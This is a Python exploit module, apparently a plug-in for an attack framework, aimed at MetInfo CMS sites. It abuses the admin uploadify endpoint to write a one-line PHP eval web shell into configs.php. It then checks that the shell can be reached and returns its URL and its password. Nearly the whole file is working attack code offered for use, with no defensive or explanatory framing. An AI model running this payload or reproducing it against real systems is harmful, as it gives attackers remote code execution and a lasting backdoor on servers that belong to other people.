'''
This is a default payload
if there is a backdoor in upload/upload.php,and key is pass
The real situation is much more complex
metinfonow is from
select value from met_config where name='met_member_force';
'''
import sys
import base64
sys.path.append('..')
from models.payload import Payload,PayloadFailException
import requests
from models.horse import Horse
from utils import Utils

class P(Payload):
    def attack(self):
        try:
            metinfonow = 'zitkifx'
            path = 'configs.php'

            url = 'http://{0}/admin/index.php?c=uploadify&m=include&a=doupfile&lang=cn&metinfonow={1}&html_filename={2}'.format(self.host,metinfonow,path)
            requests.post(url,files={
                'test':('<?php @eval($_POST[c]);?>','test','image/png')
            },timeout=2)
            url2 = 'http://{0}/{1}'.format(self.host,path)
            res = requests.get(url2,timeout=2)
            if res.status_code == 200:
                return url2,'c'
            else:
                raise PayloadFailException('simple horse write fail')
        except Exception as e:
            raise PayloadFailException(str(e))